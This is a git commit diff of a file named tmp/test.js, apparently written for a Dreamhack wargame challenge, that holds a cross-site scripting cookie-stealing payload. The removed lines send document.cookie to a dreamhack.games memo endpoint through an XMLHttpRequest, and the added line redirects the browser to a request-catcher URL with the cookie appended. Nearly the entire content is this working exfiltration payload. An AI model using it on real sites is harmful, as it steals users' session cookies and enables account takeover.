d2e556302afd5acc4093ec3f6ae695c910936b41
limulu-k <limulu@naver.com>
2024-04-29 23:07:59 +0900

    tmp js file

--- tmp/test.js
+++ tmp/test.js
@@ -1,5 +1,1 @@
-var xmlHttp = new XMLHttpRequest();
-var c = document.cookie;
-var x = "http://host3.dreamhack.games:11511/memo?memo="+c;
-xmlHttp.open('GET', x, true);
-xmlHttp.send();
+location.href="https://nuxgqki.request.dreamhack.games?param="+document.cookie
